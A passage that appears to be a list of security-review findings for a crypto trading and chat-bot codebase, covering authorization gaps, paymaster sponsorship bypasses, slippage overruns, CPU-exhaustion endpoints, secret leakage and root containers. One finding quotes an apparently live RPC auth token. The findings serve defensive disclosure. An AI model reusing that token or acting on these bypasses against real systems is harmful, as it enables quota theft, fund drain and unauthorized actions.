description: The new key-defense model states that its conservative worst case is that every key the user does not hold is hostile and staked. However, raid analysis only models an outside attacker who buys at least one fresh key, and `raidProfit` only counts payout on newly bought keys as attacker profit. When the user is below veto control, existing hostile holders can already satisfy the vote threshold with zero new purchases and receive their pro-rata distribution from the pot. For example, with supply 30, user keys 10, and pot $10, the code/test classifies the room as `economically-protected` because buying one fresh key is fee-negative, but the 20 existing hostile staked keys can already vote and receive 0.72 * 10 * 20 / 30 = $4.80 with no marginal buy cost. The UI then exposes this incorrect `raidUnprofitable` result as `Raid-proof: Yes` and `Safe until pot ...`, which can mislead users into donating funds that hostile keyholders can immediately distribute.

title: Partial defense closes can execute as full closes
description: The new liquidation-defense/harvest flow derives partial close actions and explicitly relies on `close --size <usd>` to shave only part of a position. However, the patched `patches/dgclaw/trade.ts` initializes the order size to `fullSize` and treats a requested partial close that rounds to zero as a full close. If an asset has coarse `szDecimals` or a high price, `formatSize(requestedUsd, midPrice, meta.szDecimals)` can produce `"0"`; the code then leaves `sz` as the entire position. This violates the defense code's assumption that healthy harvests never full-close and can unexpectedly liquidate the bot's whole hedge/position when only a partial reduce was intended.

title: Harvest status leaks bot wallet trading summaries
description: The status endpoint only requires a valid user session. When `?harvest=1` is supplied, it resolves an Arena identity for the selected address and falls back to room or environment defaults, then fetches and returns summaries for `identity.agentWalletAddress`. Because the endpoint does not require an active counter-trade opt-in, room access, admin rights, or ownership of the resolved bot identity, any authenticated user can query aggregate trading performance and learn the bot wallet address for the room/default agent. Hyperliquid fills may be public once the wallet address is known, but this change discloses the operational wallet address and curated PnL/fee/volume summaries through an application endpoint without proper authorization.

title: Pre-signed UserOp sender is not bound to current CSW
description: The commit changes the paste flow to freeze and later submit a preBuiltUserOp. However, _submitOwnerViaSelfBuiltUserOp only checks that the frozen UserOp callData matches the supplied innerCallData and that the frozen nonce equals readReplayableNonce(params.csw). It never checks preBuiltUserOp.sender against params.csw. RemoveOwner passes the frozen userOp from pasteFlow together with the current canonicalCswAddress. If the canonical CSW changes between prepare and submit, or a caller supplies mismatched parameters, the nonce preflight is performed against params.csw while handleOps is encoded from preBuiltUserOp.sender. As a result, a valid pasted signature can be relayed for a stale/different smart wallet than the one the submission path currently identifies. In an owner-removal flow this can execute an unintended owner mutation on the stale CSW if the signed nonce is still valid. A robust fix should reject when preBuiltUserOp.sender.toLowerCase() !== params.csw.toLowerCase(), read the nonce for the same sender that will be encoded into handleOps, and reset the paste-flow state on canonical CSW/account changes.

title: Security CI gates downgraded to non-blocking
description: The workflow previously enforced full-history gitleaks on PR/push and failed the default Slither lane on high-impact findings. This commit limits the full-history gitleaks job to scheduled/manual runs and marks it continue-on-error, so it no longer blocks merges or pushes. It also removes the default Slither high-impact failure step and leaves blocking Slither enforcement only for PRs whose source branch starts with launch/. Because the workflow itself only triggers push events for main/master, the claimed launch/* push protection is not active here, and ordinary contract PRs to main/master from non-launch branches are now report-only for high-impact Slither findings. This is a security-process regression rather than an immediately exploitable runtime bug, but in a repository containing fund-custody smart contracts and operational secrets it can allow known high-impact findings or full-history secret-scan regressions to reach protected branches if reviewers miss them.

title: Pool-level BEGIN causes cross-request DB transaction races
description: The newly added runBootstrapTransaction() and withDbTransaction() helpers call db.query('BEGIN'), then execute the body with the same pool-backed db object, and finally call db.query('COMMIT') or ROLLBACK. In this codebase, the normal db.sql/db.query methods are implemented with activePool.query(...), which acquires and releases a pool client per statement. A transaction started this way is not bound to the following SQL statements. Under concurrency, another request can reuse the connection left in an open transaction, so unrelated profile/wallet writes may be committed or rolled back by the wrong request. Conversely, the intended statements may execute on another connection in autocommit mode. The affected call sites wrap identity-critical mutations: waitlist account/profile/referral/points bootstrap and Privy wallet synchronization into profiles/profile_wallets. This can corrupt authentication/identity state, mis-link wallets, lose or incorrectly award points, or cause denial of service through leaked idle-in-transaction connections. The codebase already has a safe runInTransaction helper that checks out one client and passes a client-bound txDb, but these new helpers bypass it.

title: Strategy status auto-provisions Arena identities
description: The new `/strategy status` handling now calls `autoProvisionArenaIdentityForStrategy` whenever Arena is enabled and the caller has no mapped Arena identity. That helper runs privileged Arena/ACP setup commands, creates an agent identity, writes an identity mapping, and performs join/activate/add-api-wallet onboarding. However, `/strategy status` is not treated as an operator-only command; only `/strategy bias`, `/arena`, and `/signal` are restricted. As a result, any low-privileged user who is allowed to issue normal Hermit/AlfaClub commands can trigger external agent creation/onboarding merely by asking for status. This violates the expected read-only semantics of a status command and can abuse service-side Arena/ACP credentials or quotas, mutate operational identity state, and cause unwanted external resource creation. The in-memory retry guard only throttles repeated failures per process/address and does not address successful provisioning or multi-user abuse.

title: Unthrottled vanity salt endpoint enables CPU DoS
description: The new `/api/deploy/vanity/share-oft-salt` route is exposed through the public catch-all API. It only verifies that the caller has a session/SIWA principal, then accepts caller-controlled `create2Deployer`, `initCode`, `startAt`, `suffix`, and `maxAttempts`. The request budget is capped at 50,000,000 attempts, but there is no per-user/IP durable or in-memory rate limit in this handler. The handler then calls `findCreate2SaltForSuffixOnServer`, which invokes the CPU-bound WASM search synchronously with the supplied attempt count. Because the shared suffix normalizer allows up to 40 hex characters, an attacker can choose an effectively impossible suffix and force the full 50 million-attempt scan. Repeating or parallelizing such authenticated requests can block serverless workers, exhaust concurrency, and cause availability degradation/cost amplification for the API. The endpoint should use a strict durable rate limit, a much lower bounded attempt budget, allowed suffix lengths aligned to paid/approved vanity features, and ideally an asynchronous job/queue rather than synchronous request handling.

title: Salt override entitlement can be bypassed
description: This commit removes the canonical split Phase-1 batcher from the salt-disabled list by changing `SPLIT_PHASE1_SALT_DISABLED_BATCHER` to an older pre-v1.10 batcher and omitting the canonical `SPLIT_PHASE1_DEPLOYMENT_BATCHER` from `SHARE_OFT_SALT_OVERRIDE_DISABLED_BATCHERS`. As a result, non-zero `shareOftSaltOverride` values are no longer scrubbed for the production default batcher when the bytecode supports salt overrides. The server detects that a non-zero salt override is present, but the vanity entitlement check skips paid-feature enforcement whenever the user-provided body says `vanity.shareSuffix` is the free default `4626`. There is no corresponding verification that the supplied salt actually predicts a ShareOFT address ending in `4626`. An authenticated deployer can therefore submit salted Phase-1 calls using an arbitrary vanity salt, set `vanity.shareSuffix` to `4626`, and bypass the paid custom ShareOFT vanity entitlement.

title: Arena command resolution fails open to fallback binaries
description: Previously, live Arena operations executed only the exact ARENA_DGCLAW_BIN resolved under ARENA_DGCLAW_DIR, and a missing binary caused preflight failure. The new resolver enumerates additional candidates such as dgclaw.sh, scripts/dgclaw.sh, and /app/dgclaw-skill when the configured relative binary is absent. Because ensureDgclawReady validates only the selected candidate's working directory, a stale hardened wrapper, typoed binary, or even a nonexistent configured directory can be bypassed if a fallback script exists. buildDgclawCommand then executes that fallback with the service environment. For Arena join/activate/add-api-wallet flows, this can cause privileged server-side CLI actions to run through a binary the operator did not explicitly configure or approve.

title: Arena onboarding failures can leak subprocess output to chat
description: The new runArenaOnboardSequence diagnostics collect each failed onboarding step and format step.result.message, step.result.run.error, step.result.run.stderr, and step.result.run.stdout into the user-visible Hermit reply. Those run fields come directly from execFile failures of external dgclaw commands executed with the full process environment. The sanitizer only replaces ARENA_* KEY=value patterns and the configured dgclaw directory, leaving common sensitive values such as ACP_ACCESS_TOKEN, ACP_REFRESH_TOKEN, private keys, API wallet secrets, bearer tokens, JSON fields, stack traces, or other environment dumps unredacted. Because /arena responses are posted back into the AlfaClub room/chat surface, a failed join/activate/add-api-wallet during /arena register can disclose operational or trading credentials to chat readers rather than keeping them in restricted logs.

title: Arena identity cache can outlive DB revocation
description: Arena identity mappings select the agentId, arena wallet, and Hyperliquid API wallet used by /arena operational commands. This commit introduces a module-global Map cache and populates it both from successful DB reads and from writes that could not be persisted. resolveArenaIdentityForContext now returns the cached identity whenever the DB is unavailable, the DB query fails, or the DB returns no active mapping. As a result, deleting or disabling a mapping in Postgres no longer reliably revokes it on a warm server process: if the mapping had previously been cached, commands can keep using the stale identity until the process restarts or some in-process clear occurs. Similarly, a failed DB upsert is now treated as success and can alter the active in-process identity without updating the source of truth. Because the resolved identity is copied into the Arena config and used by deposit/trade/join/activation commands, stale or unpersisted identity state can affect privileged Arena execution.

title: ACP refresh tokens exposed in process arguments
description: The new `runArenaCreateAgent` logic reads `ACP_ACCESS_TOKEN` and `ACP_REFRESH_TOKEN` from environment variables, then builds an `acp configure --token <access> --refresh-token <refresh> --wallet <owner>` command. `runCommand` executes that array with `execFile`, which still places every argument in the child process argv. On Unix-like systems, process command lines are commonly observable through `/proc/<pid>/cmdline`, `ps`, container/runtime telemetry, debug tooling, or process accounting. This is materially worse than keeping the values in a protected environment/secret store because the ACP refresh token is long-lived and can be used to mint new ACP access tokens. The same block also does not verify the configure command succeeded before auditing `acp_session_rotation` and continuing to create the agent, which can result in creation under a stale ACP session if rotation fails.

title: Unauthenticated status polling can exhaust approval DB
description: After this commit, GET /api/base-mcp/request-status calls DurableApprovalStore.get(). The handler does not require the Base MCP agent secret or approval webhook secret and only checks that requestId is non-empty. For every arbitrary requestId, the durable store initializes schema if needed, then runs an UPDATE to expire the request and a SELECT to fetch it. An unauthenticated attacker can repeatedly send random requestIds and force database work, potentially exhausting the shared Postgres pool/CPU and disrupting Base MCP approvals and other DB-backed API paths. The endpoint should reject malformed requestIds before touching the DB, and should add durable rate limiting or require an appropriate polling credential.

title: Authenticated vanity endpoint allows CPU exhaustion
description: The new `/api/deploy/vanity/per-vault-version` route is reachable through the catch-all API router. It only checks that some session or SIWA principal exists, then discards that principal and runs a body-controlled vanity search for arbitrary `owner`, init code, prefixes, `startAttempt`, and `maxAttempts`. The server-side budget defaults to 50,000,000 attempts and can be configured up to 500,000,000. When WASM is unavailable it falls back to a synchronous TypeScript loop that repeatedly derives salts and hashes init code without yielding; when WASM is available it still burns CPU for the requested search. Because the route has no durable rate limit, queueing, per-user ownership check, small hard cap, or request cancellation budget, any logged-in account can repeatedly submit worst-case searches and consume serverless CPU/concurrency, degrading availability and increasing costs.

title: Paymaster accepts under-validated Universal Router swaps
description: The paymaster allowlist was broadened so a no-approval Universal Router call is considered a sponsored swap when router calldata contains one candidate token byte sequence such as USDC. The existing Universal Router validation checks canonical encoding, allowed opcodes, input count, and a raw substring token reference, but it does not decode each Universal Router command input or verify that the referenced token is the paid/sell token, that recipients are constrained, or that the input shape is a valid swap route. The added test demonstrates the problem by building a Universal Router V3_SWAP_EXACT_IN command whose input is only a padded USDC address, and the validator still returns mode='swap'. An authenticated/allowlisted user can therefore get paymaster sponsorship for arbitrary Universal Router executions that merely embed an allowed token address in the calldata. This primarily exposes the protocol paymaster to gas/resource drain and sponsorship policy bypass rather than direct theft of user funds, because the UserOp sender/session ownership checks still apply.

title: Swap retry can exceed manual slippage cap
description: Manual slippage is used as the retry cap when auto slippage is disabled, but the new resolveSwapSendRetrySlippagePct helper only caps the next escalated slippage value. If escalation is blocked and the error is retryable on the first send attempt, it returns activeSlippagePct without checking that activeSlippagePct is still within parsedSlippage or slippageEscalationCapPct. In the Zora CSW flow, activeSlippagePct can be raised from the refreshed quote's recorded slippage, and the existing Zora preparation code can force a 5% CSW ladder entry even when the caller's cap is lower. The new retry then refreshes and resubmits at that over-cap value instead of failing. For a user who explicitly chose a low manual slippage, this can execute a retried swap with a wider minimum-output tolerance than the UI setting implies, increasing sandwich/MEV loss exposure.

title: Live AlfaClub fallback misroutes commands across rooms
description: When wsIngestAllRoomsEnabled is enabled, shouldReuseLiveCommandSocket now keeps the first websocket open across poll-room rotation. The new onMessage logic then filters inbound websocket messages against all configured poll rooms and pushes all matching commands into the shared liveCommandQueue. However, AlfaClubCommandMessage contains only id/date/sender/text and collectAlfaClubCommandMessages drops the source roomId. Later, the auth-failure live-fallback path drains the entire shared queue and passes the current runBridgeTick roomId into executeCommandBatch. executeCommandBatch uses that roomId for the deterministic executor chatId, outbound replies, reactions, follow-ups, and mark-read calls. As a result, while live fallback is active, a slash command sent in a secondary configured room can be processed under the primary/current room context and produce bot output in the wrong room. This breaks the room boundary, can bypass per-room Hermit cooldown/preference/market-context assumptions, and lets a room participant cause bot activity in another configured command room. The fix should preserve roomId on queued live commands and drain/execute them per source room, or keep separate room-scoped live queues.

title: Telemetry sampling breaks keeper idempotency state
description: The patch wraps writes to `control_plane_stages` and `keepr_workflow_checkpoints` in `shouldSampleEvent()`. These tables are not purely observational. `control_plane_stages` is referenced by `keeper_jobs.stage_id`; however `createControlPlaneStage()` now returns `persisted: true` even when sampling skips the INSERT. Callers then pass the non-existent `stageId` to `enqueueKeeperJob()`, whose `stage_id` has a foreign-key reference to `control_plane_stages`, so a sampled-out stage can make control-plane queueing fail for provision, maintenance, settlement, and operator-action workflows. Separately, `keepr_workflow_checkpoints` is used as the idempotency record before calling the Solana orchestrator. If sampling skips the completed checkpoint write, later retries or replays will not see `status = completed` and will call the side-effecting `/reconcile` upstream again instead of returning `already_processed`.

title: Public Ethos maintenance RPCs bypass admin auth
description: The new `/api/admin/ethos/refresh` route correctly requires an authenticated admin before invoking chart refresh and snapshot functions. However, the migrations create the same functions as `public.*` functions and do not revoke default EXECUTE privileges or otherwise restrict them to `postgres`/`service_role`. Several functions mutate or delete chart state, including `prune_ethos_daily_snapshots`, `prune_ethos_hourly_snapshots`, and `prune_ethos_15min_snapshots`, whose `keep_days`/`keep_hours` arguments are also unbounded. If exposed through Supabase PostgREST RPCs, an unauthenticated client with the public anon key could call these functions directly, e.g. with a negative retention window to delete historical snapshot rows, or repeatedly trigger expensive refresh/snapshot work to degrade database availability. The fix is to `REVOKE ALL ON FUNCTION ... FROM PUBLIC, anon, authenticated`, grant only trusted service roles, consider moving these functions to a private schema, and validate retention arguments inside the functions.

title: Hermit agent now runs as root in Docker image
description: The runner stage does not set a non-root USER, so commands execute as root by default. Before this commit, the Hermit path used `exec gosu node npx tsx ...`, which dropped privileges to the `node` user. The new Hermit path directly executes `./node_modules/.bin/tsx`, and the recommended Railway start command also omits `gosu node`. As a result, when `AGENT_PROCESS=hermit` is used, the externally reachable Hermit bootstrap/health server and the chat bridge runtime run as uid 0. This does not by itself provide an unauthenticated exploit, but it is a security regression: any later vulnerability in the Hermit HTTP surface, tsx/runtime dependency chain, or untrusted chat/Pinata/AlfaClub message processing would execute with root privileges inside the container and could modify root-owned application files or mounted data. The Hermit branch should continue to use `exec gosu node ./node_modules/.bin/tsx server/agents/hermit/bootstrap.ts`, or the image should switch to `USER node` after ensuring required writable directories are owned by that user.

title: Hermit container now runs the service as root
description: The Hermit image is built from the official Node image and does not set a non-root USER in the runner stage. Before this commit, the CMD executed the application through `gosu node`, dropping privileges to the built-in `node` user. The new CMD starts `tsx` directly, which means the long-lived Hermit process runs as root. This service processes external chat/agent inputs and holds operational secrets such as database and AlfaClub/Pinata credentials. Running as root does not create a standalone remote exploit, but it removes an important containment boundary: any future RCE, dependency compromise, prompt/tool abuse that reaches local code execution, or file-write bug would execute with root privileges inside the container and could modify root-owned application files, dependencies, and any mounted paths accessible to the container. The safer fix is to keep the direct local binary but execute it as the `node` user, for example with an exec-form CMD using `gosu node`, or set `USER node` after ensuring required writable directories are owned appropriately.

title: 1659 doctor prints production secrets to logs
description: The newly added diagnostic script is intended to be run with the real production/Railway environment. It then constructs copy-paste blocks using raw `process.env` values and prints them directly to stdout. This exposes sensitive operational secrets in terminal scrollback, CI logs, Railway command logs, shared screen recordings, or any log collector capturing command output. The leaked values include `DATABASE_URL`, AlfaClub JWT and Privy tokens, Pinata bearer token, and Telegram bot token. Compromise of these values could allow unauthorized database access, authenticated AlfaClub/chat actions, abuse of Pinata/OpenClaw integration, or Telegram bot control. A diagnostic tool should only print presence/absence or masked values, e.g. `ALFACLUB_CHAT_JWT=<set: sha256:abcd...>`.

title: Doctor script prints live service secrets
description: The added helper in scripts/agent/railway-hermit-doctor.ts prints sensitive environment variable values directly to stdout, including DATABASE_URL, AlfaClub JWT/Privy access and refresh tokens, and the Pinata bearer token. Operators are instructed to run this script with the same environment intended for Railway, so successful runs will place live database credentials and authentication tokens into terminal scrollback, shell/session logs, CI logs, or Railway/ops log collectors if the script is run there. Anyone with access to those logs could reuse the leaked credentials to access the Supabase/Postgres database, impersonate the AlfaClub bot session, or call the Pinata/OpenClaw endpoint. The previous doctor output only reported presence/absence; the commit introduced raw secret disclosure.

title: Ops script disables TLS verification for Supabase secrets
description: The new `send-hermit-to-1659.ts` script creates a PostgreSQL connection using `ssl: { rejectUnauthorized: false }` and immediately queries `alfaclub_runtime_secret.secret_value` for the `chat_jwt`. Disabling server certificate verification removes authentication of the Supabase endpoint. If an operator runs this script on an untrusted network or through a compromised route/proxy, a man-in-the-middle can terminate the TLS connection, proxy it to the real database, and observe the decrypted query result containing the live AlfaClub chat JWT. That token is then used to send messages as Hermit, so compromise can lead to unauthorized bot impersonation and disclosure of operational secrets.

title: Batched swap estimate failures can be bypassed
description: The new swap-router detection applies a gas floor whenever any call has the swap-proxy selector 0x2894adf9, without checking that the call target is the canonical swap-proxy address. For batched calls, preflightDirectCallSucceeded is set to true when simulateSmartWalletCalls returns success for the batch. However, simulateSmartWalletCalls only performs direct target-call simulation for single-call operations; for batches, an Unauthorized executeBatch simulation is treated as success without proving that the inner swap/approval calls succeed. The new shouldAdvisorySkipBundlerGasEstimate path then treats actionable ExecutionFailed or InvalidContractSignature revert selectors as ignorable stub-signature artifacts whenever that flag is true. As a result, a real bundler simulation failure for a batched sponsored swap can be downgraded to an advisory warning and the UserOperation can be sent with a large static callGasLimit. This weakens the fail-fast simulation barrier and can waste sponsored paymaster quota/funds or user nonce/gas if the upstream bundler accepts the reverting operation.

title: Auth state changes no longer refresh account data
description: Before this commit, loadMe depended on privyAuthed/getAccessToken, so the useEffect that calls loadMe reran when authentication changed. The commit changed loadMe to read Privy through refs and gave it an empty dependency array, while leaving the automatic load effect dependent only on loadMe. Since loadMe is now stable, that effect runs only once. On pages such as AccountsPage, the sign-in button only calls controller.login and relies on the controller to fetch /api/accounts/me afterwards; after this change, a newly authenticated user can be left with no account data loaded. More importantly, if account state from a previous authenticated user remains in memory and Privy transitions to another authenticated user without a full page reload, the UI can render stale me data for the previous user under the new privyAuthed state. Server endpoints still verify the current Privy token, so this is primarily a client-side stale identity/PII disclosure and account-management confusion issue rather than direct backend authorization bypass.

title: Daily spend cap can be bypassed by concurrent UserOps
description: submitUserOpOrRefuse first reads the current daily spend and checks alreadySpentWei + valueWei against issuer.dailyCapWei. Later, it calls recordIssuerDailySpend, but the new helper only performs an INSERT/ON CONFLICT increment and returns the new total; it does not atomically enforce the cap, and the caller does not compare reserve.newTotalWei to dailyCapWei. Two or more concurrent command/UserOp submissions for the same profile can each read the same pre-reservation spend, pass the cap check, then all increment the ledger and submit. For example, with a 1 ETH daily cap and 0 spent, two simultaneous 0.7 ETH requests both pass the read-time check and can submit 1.4 ETH total. This weakens the daily cap as a security control for command issuer automation and can allow excess asset movement up to the per-transaction cap, account balance, or spend-permission allowance.

title: Hermit X media upload can fetch unbounded external URLs
description: Before this change, Hermit cross-posts placed the media URL in tweet text; X or the user's client fetched the URL. The new buildHermitXPostPayload path attaches media: { url }, causing postTweetFromSystem to call uploadTweetMedia and downloadTweetMedia from the backend. downloadTweetMedia performs a raw fetch and then response.arrayBuffer(), so a slow or very large image response can tie up the serverless invocation or exhaust memory. It also does not reuse the repository's external-fetch protections for allowlisted hosts, timeouts, response-size limits, or private-network blocking. The new helper validates only that the string looks like an image URL by extension before passing it to this sensitive fetch path. This is especially risky because Hermit /meme output is produced by an external creative provider and /gmeow media can be configured via the meme library; once a URL reaches this new media field, the backend fetches it.

title: Hardcoded paid RPC auth token exposed in ops script
description: The new `simulate-deploy-bytecode-infra.ts` ops script unconditionally calls a hardcoded Matrixed RPC endpoint containing `auth=p886of4gitu82`. Because this credential is committed in source, anyone with repository access can reuse it to make RPC requests, consume paid quota, cause billing/availability impact, or force token rotation. The script already supports environment-based RPC configuration for the first run, so the paid endpoint should also be read from an environment variable or removed. The exposed token should be rotated.

title: Cron history cap enables AlfaClub command suppression
description: The commit changes the Vercel cron path to use readAlfaClubChatBridgeFlagsForCronTick(), which defaults ALFACLUB_BRIDGE_CRON_HISTORY_LIMIT to 12 and applies Math.min() against the normal history limit. The same cron path also defaults skipLiveWebSocket to true and enables ingestCommandCandidatesOnly. In stateless cron mode, command execution is then restricted to messages whose IDs were returned as newly inserted by upsertAlfaClubIngestMessages. If an attacker who can post in the AlfaClub room sends enough ordinary messages after a victim's command before the next cron tick, the command falls outside the latest 12 history rows. Since live WS is skipped, it is not captured elsewhere; since it was never fetched, it is never inserted into the DB dedupe ledger, and later ticks will continue polling only the newer window. This creates a low-cost denial of service against chat-triggered AlfaClub/Hermit command processing.

title: Unauthenticated chat command can force-post digests
description: This commit adds a manual `/alfa brief post` / `/alfa digest send` path. The AlfaClub command family does not add any admin/operator allowlist for this new mutating action; it only receives the sender wallet and immediately calls `runAlfaClubDailyBrief()` with `forceSend: true`. The chat bridge accepts slash commands from any history message with a hex sender address and routes the `alfaclub` family without a role check. Because `forceSend` disables the daily dispatch dedupe check, an unprivileged room participant can repeatedly trigger bot-authenticated posts into `ALFACLUB_DAILY_BRIEF_ROOM_ID`, including a room intended to be read-only for normal users. This is an authorization/integrity issue and can also be used for bounded spam/DoS of the digest room and upstream send APIs.

title: Daily brief cron disables AlfaClub room access policies
description: The new roomPolicySync helper is enabled by default and is called from runAlfaClubDailyBrief before each non-duplicate daily brief. For every snapshot candidate it calls upsertAlfaClubRoomAccessPolicy with enabled: false and a default pool address when ALFACLUB_DEFAULT_POOL_ADDRESS is unset. The existing upsert implementation updates all fields on room_id conflicts, including enabled, pool_address, thresholds, grace_hours, and key_amount_raw. As a result, any admin-created room_access_policies that are already enabled can be silently reset to disabled on the next daily brief cron. Since joinAlfaClubRoomAccess rejects disabled policies and membership rechecks no-op when disabled, this can break token-gated room access and prevent legitimate users from joining until an admin repairs the policy. The sync should insert missing placeholder mappings only, or preserve existing enabled/configured policy fields on conflict.

title: Zora swaps can exceed user slippage limits
description: The Zora execution path now calls executeZoraCswQuoteWithEscalation, which builds a ladder of higher slippage values and refreshes router calldata with those values after simulation failures. This bypasses the user-selected slippage tolerance from useSwapState, which defaults to 0.5% and is capped at 5%. For example, a user selecting 0.5% can be retried at 2%, 5%, and 10%, and a user selecting 3-5% can be retried up to 15%. The code only asks for another Permit2 signature, but the signed Permit2 message contains token/spender/amount/nonce/deadline, not the router minOut/slippage terms, so wallet confirmation does not enforce or clearly authorize the higher slippage. This creates a loss-of-funds risk for low-liquidity creator-token swaps and increases sandwich/price-manipulation exposure. The safer behavior is to fail and prompt the user to explicitly change slippage, and to validate any API-returned quoted slippage against the user's configured maximum.

title: Canonical swaps clear pending UserOp state too early
description: Canonical smart-wallet swaps are configured to return as soon as the bundler accepts the UserOperation (`waitForOnChainReceipt: false`) and to use a fresh EntryPoint nonce lane (`preferEphemeralNonceLane: true`). The new Zora path tries to prevent stale Permit2 nonce races by reading any stored pending UserOp hash and waiting for it before re-signing/submitting another swap. However, `sendCoinbaseSmartWalletUserOperation` stores the pending hash when the UserOp is accepted, then immediately calls `clearAllPendingUserOpHashesForWallet` in the non-waiting branch before returning. Since canonical swaps use that branch, the pending hash is gone while the transaction is still only in the bundler/mempool and the asynchronous receipt poll is still running. A subsequent Zora swap therefore sees no pending operation, reads the old on-chain Permit2 nonce, signs another permit with the same nonce, and submits it on a fresh EntryPoint nonce lane. One operation may succeed and the others can revert after the Permit2 nonce is consumed, still costing sponsored gas. This undermines the commit's intended pending-swap guard and creates a paymaster/sponsorship drain and reliability issue.

title: Permit2 needle can bypass Zora paymaster swap policy
description: For no-approval Zora Universal Router calls, the validator attempts to infer the swap input token by checking whether raw router calldata contains one of several candidate addresses. This commit added `permit2` to that candidate list. If calldata contains the Permit2 address anywhere, `swapInputToken` becomes the Permit2 contract address even though Permit2 is not the asset being sold. The later Zora validation only repeats the same raw substring check, so it accepts the call. Once `mode` is set to `swap`, validation returns early and does not decode Zora router commands or enforce the stricter opcode/input checks used for the non-Zora Universal Router overload. Because the allowlist check is session-based and does not bind or reject `creatorToken == permit2`, an authenticated/allowlisted sender can obtain paymaster sponsorship for arbitrary single-call Zora Universal Router payloads that merely contain the Permit2 address, rather than a sanctioned USDC/ZORA/WETH swap. This can be abused to drain sponsored gas budget or subsidize unintended router operations.
